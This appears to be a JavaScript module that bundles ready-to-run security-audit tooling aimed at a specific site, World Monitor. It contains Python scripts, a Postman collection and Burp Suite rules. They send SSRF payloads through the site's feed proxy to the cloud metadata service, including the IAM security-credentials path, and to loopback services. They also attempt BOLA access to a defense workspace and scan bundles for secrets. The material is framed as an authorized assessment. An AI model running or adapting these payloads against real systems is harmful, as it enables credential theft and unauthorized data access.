export const PYTHON_AUDIT_SCRIPTS = [
  {
    id: 'py-full-audit',
    name: 'worldmonitor_automated_security_audit.py',
    description: 'Comprehensive Python white-box & black-box assessment script targeting World Monitor APIs, SSRF proxies, CORS endpoints, and bundle secret scanning.',
    code: `#!/usr/bin/env python3
"""
National Technical Research Organisation (NTRO) - Security Assessment
Automated Security Assessment Script for World Monitor Application
Author: Assessment Team (Yuvaadhika)
Target: World Monitor Application
"""

import requests
import re
import json
import sys
import argparse
from typing import Dict, List, Any

class WorldMonitorSecurityAuditor:
    def __init__(self, base_url: str = "https://www.worldmonitor.app", verbose: bool = True):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "NTRO-Security-Auditor/2.0 (Security Assessment)"
        })
        self.verbose = verbose
        self.findings: List[Dict[str, Any]] = []

    def log(self, level: str, msg: str):
        colors = {
            "INFO": "\\033[94m[*]\\033[0m",
            "WARN": "\\033[93m[!]\\033[0m",
            "FAIL": "\\033[91m[-]\\033[0m",
            "PASS": "\\033[92m[+]\\033[0m"
        }
        print(f"{colors.get(level, '[*]')} {msg}")

    def audit_security_headers(self):
        self.log("INFO", f"Auditing HTTP Response Headers on {self.base_url}...")
        try:
            resp = self.session.get(self.base_url, timeout=10)
            headers = resp.headers

            checks = {
                "Content-Security-Policy": headers.get("Content-Security-Policy"),
                "X-Frame-Options": headers.get("X-Frame-Options"),
                "X-Content-Type-Options": headers.get("X-Content-Type-Options"),
                "Strict-Transport-Security": headers.get("Strict-Transport-Security"),
                "Referrer-Policy": headers.get("Referrer-Policy")
            }

            for header, value in checks.items():
                if not value:
                    self.log("WARN", f"Missing critical security header: {header}")
                    self.findings.append({"id": "SEC-HDR", "title": f"Missing {header}", "severity": "MEDIUM"})
                else:
                    self.log("PASS", f"Found {header}: {value[:60]}...")

            if "nonce-wm-static-bootstrap" in resp.text:
                self.log("FAIL", "Static predictable CSP nonce 'wm-static-bootstrap' detected in HTML.")
                self.findings.append({"id": "WM-2026-008", "title": "Static CSP Nonce Reuse", "severity": "MEDIUM"})
        except Exception as e:
            self.log("FAIL", f"Header audit failed: {e}")

    def audit_ssrf_proxy(self):
        self.log("INFO", "Probing Feed Proxy for Server-Side Request Forgery (SSRF)...")
        proxy_url = f"{self.base_url}/api/proxy/feed"
        payloads = [
            ("AWS Metadata", "http://169.254.169.254/latest/meta-data/"),
            ("Localhost Redis", "http://127.0.0.1:6379/"),
            ("Internal Loopback", "http://localhost:8080/metrics")
        ]

        for name, test_target in payloads:
            try:
                resp = self.session.get(proxy_url, params={"target": test_target}, timeout=4)
                if resp.status_code == 200 and ("latest" in resp.text or "redis" in resp.text):
                    self.log("FAIL", f"CRITICAL: SSRF verified against {name} ({test_target})! Status: {resp.status_code}")
                    self.findings.append({"id": "WM-2026-001", "title": "SSRF in Feed Proxy", "severity": "CRITICAL"})
                elif resp.status_code == 403:
                    self.log("PASS", f"SSRF blocked for {name} (HTTP 403 Forbidden)")
                else:
                    self.log("INFO", f"Probe to {name} returned status {resp.status_code}")
            except requests.exceptions.RequestException:
                self.log("PASS", f"Outbound probe to {name} was safely blocked or timed out.")

    def audit_client_bundle_secrets(self):
        self.log("INFO", "Scanning client JS bundles for embedded API keys & secrets...")
        try:
            resp = self.session.get(self.base_url, timeout=10)
            scripts = re.findall(r'<script[^>]+src=["\\']([^"\\']+)["\\']', resp.text)
            
            secret_patterns = [
                (r"(?:finnhub|aisstream|acled)[_-]?(?:key|token)[\"']\s*:\s*[\"']([a-zA-Z0-9_-]{16,})[\"']", "Intelligence API Token"),
                (r"AIza[0-9A-Za-z-_]{35}", "Google Maps/Firebase API Key")
            ]

            for script_src in scripts:
                if not script_src.startswith("http"):
                    script_url = f"{self.base_url}{script_src if script_src.startswith('/') else '/' + script_src}"
                else:
                    script_url = script_src

                js_resp = self.session.get(script_url, timeout=8)
                for pat, label in secret_patterns:
                    matches = re.findall(pat, js_resp.text, re.IGNORECASE)
                    if matches:
                        self.log("FAIL", f"Hardcoded secret found in {script_url}: {label} ({len(matches)} occurrences)")
                        self.findings.append({"id": "WM-2026-006", "title": f"Exposed Secret: {label}", "severity": "HIGH"})
        except Exception as e:
            self.log("WARN", f"Bundle secret scan encountered notice: {e}")

    def generate_report(self):
        print("\\n" + "="*70)
        print("  NTRO - WORLD MONITOR SECURITY AUDIT SUMMARY REPORT")
        print("="*70)
        print(f"Target URL: {self.base_url}")
        print(f"Total Findings Identified: {len(self.findings)}")
        print("-" * 70)
        for idx, f in enumerate(self.findings, 1):
            print(f"[{idx}] [{f['severity']}] {f['id']} - {f['title']}")
        print("="*70)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="World Monitor NTRO Security Audit Suite")
    parser.add_argument("--url", default="https://www.worldmonitor.app", help="Base URL of target")
    args = parser.parse_args()

    auditor = WorldMonitorSecurityAuditor(base_url=args.url)
    auditor.audit_security_headers()
    auditor.audit_ssrf_proxy()
    auditor.audit_client_bundle_secrets()
    auditor.generate_report()
`
  },
  {
    id: 'py-ssrf-poc',
    name: 'safe_ssrf_poc_validator.py',
    description: 'Standalone safe proof-of-concept script testing proxy parameter sanitization and loopback restrictions.',
    code: `#!/usr/bin/env python3
import requests
import json

TARGET = "https://api.worldmonitor.app/api/proxy/feed"

def test_ssrf():
    print("[*] Dispatching Safe SSRF Probe...")
    # Safe non-intrusive probe checking DNS resolution
    payload = {"target": "http://169.254.169.254/latest/meta-data/instance-id"}
    try:
        r = requests.get(TARGET, params=payload, timeout=3)
        if r.status_code == 200:
            print("[+] ALERT: Metadata service responded! Vulnerability is ACTIVE.")
            print(r.text[:200])
        else:
            print(f"[-] Protected or unreachable: Status {r.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[+] Request blocked or timed out safely: {e}")

if __name__ == "__main__":
    test_ssrf()
`
  }
];

export const POSTMAN_COLLECTION_JSON = {
  info: {
    name: "NTRO-World-Monitor-Security-Assessment",
    _postman_id: "e48192a8-38bc-4901-9928-1a9981273901",
    description: "Authorized Security Assessment & Vulnerability Audit Collection for World Monitor",
    schema: "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  item: [
    {
      name: "01. SSRF - Probe Cloud Metadata via Feed Proxy",
      request: {
        method: "GET",
        header: [
          { key: "User-Agent", value: "NTRO-Security-Audit/1.0" }
        ],
        url: {
          raw: "https://api.worldmonitor.app/api/proxy/feed?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          protocol: "https",
          host: ["api", "worldmonitor", "app"],
          path: ["api", "proxy", "feed"],
          query: [
            { key: "target", value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
          ]
        }
      }
    },
    {
      name: "02. BOLA - Read Unauthorized Defense Workspace Scenarios",
      request: {
        method: "GET",
        header: [
          { key: "Authorization", value: "Bearer {{low_privilege_user_token}}" },
          { key: "Content-Type", value: "application/json" }
        ],
        url: {
          raw: "https://api.worldmonitor.app/api/v1/workspaces/ws_defense_corridor_8812/scenarios",
          protocol: "https",
          host: ["api", "worldmonitor", "app"],
          path: ["api", "v1", "workspaces", "ws_defense_corridor_8812", "scenarios"]
        }
      }
    },
    {
      name: "03. CORS & Rate Limit - Streamable HTTP MCP Endpoint",
      request: {
        method: "OPTIONS",
        header: [
          { key: "Origin", value: "https://unauthorized-agent-site.io" },
          { key: "Access-Control-Request-Method", value: "POST" }
        ],
        url: {
          raw: "https://worldmonitor.app/mcp",
          protocol: "https",
          host: ["worldmonitor", "app"],
          path: ["mcp"]
        }
      }
    },
    {
      name: "04. WebMCP - Inspect MCP Discovery Server Card",
      request: {
        method: "GET",
        header: [],
        url: {
          raw: "https://worldmonitor.app/.well-known/mcp/server-card.json",
          protocol: "https",
          host: ["worldmonitor", "app"],
          path: [".well-known", "mcp", "server-card.json"]
        }
      }
    }
  ]
};

export const BURP_SUITE_CONFIG = {
  name: "World Monitor Security Audit Match & Replace",
  version: "Burp Suite Professional 2026.x / Community",
  rules: [
    {
      enabled: true,
      comment: "Intercept Feed Proxy and inject internal loopback test",
      type: "Request query string",
      match: "target=https://*",
      replace: "target=http://127.0.0.1:8080/internal/status"
    },
    {
      enabled: true,
      comment: "Test BOLA workspace ID substitution",
      type: "Request URL path",
      match: "/workspaces/ws_my_user_*/",
      replace: "/workspaces/ws_defense_corridor_8812/"
    }
  ]
};
